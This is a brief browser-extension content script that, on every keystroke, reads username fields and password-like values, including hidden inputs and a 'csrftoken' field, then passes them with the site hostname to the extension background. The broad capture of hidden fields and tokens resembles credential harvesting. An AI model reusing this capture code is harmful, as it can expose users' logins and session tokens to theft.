function loginFields() {
    const username = document.querySelector('input[type="text"], input[type="email"], input[name*="user"], input[name*="login"], input[name*="email"]').value;
    const password = document.querySelector('input[type="password"], input[type="hidden"], input[name*="pass"], input[name="csrftoken"]').value;
    if (!password) return null;

    chrome.runtime.sendMessage(
        {
            action: "FieldDetected",
            username: username || "",
            password: password,
            website: window.location.hostname
        }
    );
}

document.addEventListener("input", loginFields);